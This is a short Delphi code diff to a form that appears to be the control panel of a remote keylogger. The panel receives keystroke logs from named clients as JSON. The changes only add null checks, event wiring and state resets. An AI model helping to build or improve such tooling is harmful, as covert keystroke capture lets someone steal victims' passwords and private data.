@@ -49,8 +49,11 @@ begin
   FOnSendJSON := SendJSONCB;
   FOnUnregister := UnregisterCB;
   Caption := 'Keylogger - ' + ClientID;
-  Memo1.Clear;
-  SetCapturing(False);
+  OnClose := FormClose; // Ensure event is linked
+  if Assigned(Memo1) then
+    Memo1.Clear;
+  FIsCapturing := False; // Reset internal state
+  SetCapturing(False);   // Update UI
 end;
 
 procedure TForm7.SetCapturing(Value: Boolean);
@@ -113,7 +116,7 @@ procedure TForm7.HandleKeyloggerJSON(JSONObj: TJSONObject);
 var
   LogValue: string;
 begin
-  if not Assigned(JSONObj) then Exit;
+  if not Assigned(JSONObj) or (csDestroying in ComponentState) or not Assigned(Memo1) then Exit;
 
   if JSONObj.Values['log'] <> nil then
   begin
